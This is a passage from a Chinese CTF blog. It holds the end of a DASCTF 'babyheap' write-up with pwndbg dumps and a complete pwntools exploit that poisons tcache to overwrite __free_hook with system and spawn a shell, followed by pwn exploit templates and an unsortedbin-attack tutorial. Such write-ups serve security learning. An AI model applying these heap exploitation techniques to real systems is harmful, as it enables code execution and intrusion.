0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb3d0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb3e0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb3f0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb400:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb410:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb420:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb430:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb440:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb450:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb460:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb470:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb480:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb490:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb4a0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb4b0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb4c0:	0x0000000000000220	0x0000000000000200	#chunk3</span><br><span class="line">0x555555adb4d0:	0x00007265746e6977	0x0000000000000000</span><br><span class="line">0x555555adb4e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<h4 id="5-unlink合并"><a href="#5-unlink合并" class="headerlink" title="5.unlink合并"></a>5.unlink合并</h4><p>2.31中对unlink加入检查，需要size==pre_size</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">"corrupted size vs. prev_size while consolidating"</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>释放chunk3，则tcache满了，chunk3中chunk2的标志位为0，认为chunk2被释放，故进行向前合并，unlink</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">9</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x55555654d090</span><br><span class="line">0x55555654d090:	0x0000000000000000	0x0000000000000111</span><br><span class="line">0x55555654d0a0:	0x0000000000000000	0x0000000000000421#fake_chunk大小改变</span><br><span class="line">0x55555654d0b0:	0x00007f809c23bbe0	0x00007f809c23bbe0</span><br><span class="line">0x55555654d0c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55555654d0d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55555654d0e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55555654d0f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55555654d100:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<blockquote>
<p> 此时已经造成堆块重叠了。</p>
<p> chunk1、chunk2与合并后的chunk重叠，并且合并后的chunk在unsortedbin中</p>
</blockquote>
<p><img src="/2021/05/13/Mar-DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210513202435970.png" alt="image-20210513202435970"></p>
<h4 id="6-释放chunk-bk"><a href="#6-释放chunk-bk" class="headerlink" title="6.释放chunk bk"></a>6.释放chunk bk</h4><p>释放chunk2和chunk4，tcache是先进先出</p>
<ul>
<li>释放chunk2、chunk4</li>
<li>chunk2 -&gt; chunk4</li>
<li>申请顺序是chunk4、chunk2</li>
</ul>
<blockquote>
<p>此时，chunk2中的fd指向下一个被释放的块</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x120 [  2]: 0x555556fae1b0 —▸ 0x555556fae4d0 ◂— 0x0</span><br><span class="line">0x200 [  7]: 0x555556fadea0 —▸ 0x555556fadca0 —▸ 0x555556fadaa0 —▸ 0x555556fad8a0 —▸ 0x555556fad6a0 —▸ 0x555556fad4a0 —▸ 0x555556fad2a0 ◂— 0x0</span><br></pre></td></tr></table></figure>

<h4 id="7-切割unsortbin"><a href="#7-切割unsortbin" class="headerlink" title="7.切割unsortbin"></a>7.切割unsortbin</h4><blockquote>
<p>申请一个大于chunk1大小的chunk，这样改chunk和chunk1+chunk2重叠</p>
<p>通过改chunk修改chunk2的fd指针，指向free_hook</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">18</span>,<span class="number">0x150</span>,<span class="string">"/bin/sh\x00"</span>+<span class="string">'a'</span>*<span class="number">0xf8</span>+p64(free_hook))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>原来0x421的chunk被分割前0x161给申请的块了</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x5555560e0090</span><br><span class="line">0x5555560e0090:	0x0000000000000000	0x0000000000000111</span><br><span class="line">0x5555560e00a0:	0x0000000000000000	0x0000000000000161#申请的chunk</span><br><span class="line">0x5555560e00b0:	0x0068732f6e69622f	0x6161616161616161#填入binsh</span><br><span class="line">0x5555560e00c0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e00d0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e00e0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e00f0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0100:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0110:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0120:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0130:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0140:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0150:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0160:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0170:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0180:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0190:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e01a0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e01b0:	0x00007f2af2d3ab28	0x00005555560d0000#chunk2的fd被修改</span><br><span class="line">0x5555560e01c0:	0x6161616161616161	0x6161616161616161</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x120 [  2]: 0x5555560e01b0 —▸ 0x7f2af2d3ab28 (__free_hook) ◂— 0x0</span><br></pre></td></tr></table></figure>

<h4 id="8-申请chunk2的fd为新的chunk"><a href="#8-申请chunk2的fd为新的chunk" class="headerlink" title="8.申请chunk2的fd为新的chunk"></a>8.申请chunk2的fd为新的chunk</h4><blockquote>
<p>chunk2的fd被修改为free_hook</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">19</span>,<span class="number">0x118</span>,p64(system))</span><br><span class="line">add(<span class="number">20</span>,<span class="number">0x118</span>,p64(system))</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x120 [  1]: 0x7f4deb068b28 (__free_hook) ◂— 0x0</span><br></pre></td></tr></table></figure>

<blockquote>
<p>free_hook作为chunk申请走了</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x200 [  7]: 0x55555636cea0 —▸ 0x55555636cca0 —▸ 0x55555636caa0 —▸ 0x55555636c8a0 —▸ 0x55555636c6a0 —▸ 0x55555636c4a0 —▸ 0x55555636c2a0 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br></pre></td></tr></table></figure>

<h4 id="9-chunk2的内容作为参数，释放"><a href="#9-chunk2的内容作为参数，释放" class="headerlink" title="9.chunk2的内容作为参数，释放"></a>9.chunk2的内容作为参数，释放</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">18</span>)</span><br></pre></td></tr></table></figure>

<p>即可get shell</p>
<h3 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">file = <span class="string">"babyheap"</span></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"><span class="comment">#local libc</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  p = process(<span class="string">"./"</span>+file)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.31.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug libc</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">1</span>:</span><br><span class="line">  p = process([<span class="string">"/usr/local/glibc-2.31/lib/ld-2.31.so"</span>, <span class="string">"./"</span>+file],</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/usr/local/glibc-2.31/lib/libc-2.31.so"</span>&#125;)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/usr/local/glibc-2.31/lib/libc-2.31.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#remote</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span>:</span><br><span class="line">  p = remote()</span><br><span class="line">  elf = ELF(<span class="string">"./file"</span>)</span><br><span class="line">  libc = ELF(<span class="string">"./libc-2.31.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"index?"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"size?"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"content?"</span>)</span><br><span class="line">    p.sendline(str(content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"index?"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">3</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"index?"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	cmd(<span class="number">4</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"(y/n)"</span>)</span><br><span class="line">	p.send(<span class="string">"n"</span>)<span class="comment">#not line</span></span><br><span class="line">	p.recvuntil(<span class="string">"index?"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"content?"</span>)</span><br><span class="line">	p.sendline(str(content))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"gift: "</span>)</span><br><span class="line">puts_addr = int(p.recv(<span class="number">14</span>).strip(),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">"puts:"</span>+hex(puts_addr)) </span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">log.success(<span class="string">"libc_base:"</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	add(i+<span class="number">2</span>,<span class="number">0x1f8</span>,<span class="string">'winter'</span>)</span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x404140</span></span><br><span class="line">fd = ptr - <span class="number">0x18</span></span><br><span class="line">bk = ptr - <span class="number">0x10</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x108</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x221</span>)+p64(fd)+p64(bk))</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x118</span>,<span class="string">'winter'</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x1f8</span>,<span class="string">'winter'</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x118</span>,<span class="string">'winter'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	delete(i+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x110</span></span><br><span class="line">payload += p64(<span class="number">0x220</span>)</span><br><span class="line">edit(<span class="number">15</span>,payload)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">18</span>,<span class="number">0x150</span>,<span class="string">"/bin/sh\x00"</span>+<span class="string">'a'</span>*<span class="number">0xf8</span>+p64(free_hook))</span><br><span class="line">add(<span class="number">19</span>,<span class="number">0x118</span>,p64(system))</span><br><span class="line">add(<span class="number">20</span>,<span class="number">0x118</span>,p64(system))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">delete(<span class="number">18</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">    </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h2 id="参考-amp-下载"><a href="#参考-amp-下载" class="headerlink" title="参考 &amp; 下载"></a>参考 &amp; 下载</h2><ul>
<li><p><a href="https://www.anquanke.com/post/id/236183" target="_blank" rel="noopener">MAR DASCTF题解</a></p>
</li>
<li><p><a href="https://www.anquanke.com/post/id/236179#h2-0" target="_blank" rel="noopener">2021 MAR DASCTF 部分PWN WriteUP</a></p>
</li>
<li><p><a href="https://r1nd0.github.io/2021/03/28/2021DASCTF-Mar-pwn-wp/" target="_blank" rel="noopener">2021DASCTF_Mar_pwn_wp(R1nd0)</a></p>
</li>
<li><p><a href="https://ainevsia.github.io/2021/03/30/2021MARDASCTF/" target="_blank" rel="noopener">2021MARDASCTF(无花果)</a></p>
</li>
</ul>

	
	</div>
  <a type="button" href="/2021/05/13/Mar-DASCTF明御攻防赛/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/05/13/pwn题模板/" >pwn wp模板</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-05-13  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="栈题"><a href="#栈题" class="headerlink" title="栈题"></a>栈题</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">file = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="comment">#local libc</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  p = process(<span class="string">"./"</span>+file)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug libc</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">1</span>:</span><br><span class="line">  p = process([<span class="string">"/usr/local/glibc-2.23/lib/ld-2.23.so"</span>, <span class="string">"./"</span>+file],</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>&#125;)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#remote</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span>:</span><br><span class="line">  p = remote()</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil()</span><br><span class="line">p.sendline()</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="堆题"><a href="#堆题" class="headerlink" title="堆题"></a>堆题</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">file = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="comment">#local libc</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  p = process(<span class="string">"./"</span>+file)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug libc</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">1</span>:</span><br><span class="line">  p = process([<span class="string">"/usr/local/glibc-2.23/lib/ld-2.23.so"</span>, <span class="string">"./"</span>+file],</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>&#125;)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#remote</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span>:</span><br><span class="line">  p = remote()</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.recvuntil()</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">()</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil()</span><br><span class="line">    p.sendline()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">()</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">    </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2021/05/13/pwn题模板/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/05/13/unsortedbin-attack/" >unsortedbin attack</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-05-13  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="针对类型"><a href="#针对类型" class="headerlink" title="针对类型"></a>针对类型</h2><p>需要修改任意地址位一个较大的值</p>
<ol>
<li>修改循环次数，执行多次循环</li>
<li>修改heap的global_max_fast（使得更大的chunk可以视为fastbin）</li>
</ol>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>可修改unsortedbin的bk指针</p>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="得到unsortbin方法"><a href="#得到unsortbin方法" class="headerlink" title="得到unsortbin方法"></a>得到unsortbin方法</h3><ol>
<li>一个大的chunk被分割 =&gt; 剩下的部分大于MINISIZE</li>
<li>释放一个不属于fastbin的chunk，该chunk不和top chunk相邻</li>
<li>进行malloc_consolidate，合并后的chunk放入unsortbin，且该chunk不和top chunk相邻</li>
</ol>
<h3 id="unosortbin链"><a href="#unosortbin链" class="headerlink" title="unosortbin链"></a>unosortbin链</h3><ol>
<li>采用FIFO的顺序</li>
<li>若fastbin和smallbin中没有对应大小块，则从unsortbin中取</li>
</ol>
<h3 id="main-arena-gt-libc-base"><a href="#main-arena-gt-libc-base" class="headerlink" title="main_arena =&gt; libc_base"></a>main_arena =&gt; libc_base</h3><p>因为main_arena和__malloc_hook只相差0x10，所以</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_base = main_arena - <span class="number">0x10</span> - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br></pre></td></tr></table></figure>

<h3 id="unsortedbin-attack"><a href="#unsortedbin-attack" class="headerlink" title="unsortedbin attack"></a>unsortedbin attack</h3><blockquote>
<p>当将一个 unsorted bin 取出的时候，会将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置。</p>
</blockquote>
<h4 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h4><ol>
<li>将一个chunk放入unsortedbin中</li>
<li>修改该chunk的bk指针为target-0x10</li>
<li>申请该大小的chunk</li>
</ol>
<h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><p>修改target地址的值为&amp;main_arena+0x88</p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="hitcontraining-magicheap"><a href="#hitcontraining-magicheap" class="headerlink" title="hitcontraining_magicheap"></a>hitcontraining_magicheap</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ol>
<li>存在后门函数，只要修改magic的大小&gt;0x1305即可，故使用unsortedbin</li>
<li>edit的size自己输入，存在堆溢出，故可以修改bk指针。</li>
</ol>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
<li><p>申请三个块</p>
<p>chunk1是为了堆溢出修改第二个块的bk</p>
<p>chunk2主要进行unsortbin attack</p>
<p>chunk3防止和top chunk合并</p>
</li>
<li><p>释放chunk2</p>
<p>chunk申请大小0x100，大于fastbin大小，从而进入unsortbin链</p>
</li>
<li><p>堆溢出chunk1，修改chunk2的bk指针</p>
<p>修改位magic-0x10的位置</p>
</li>
<li><p>重新申请0x100的大小，从而将chunk2从unsortbin中取出，从而向bk指向的地址写入&amp;main_arena+0x88</p>
</li>
<li><p>进入后门函数</p>
</li>
</ol>
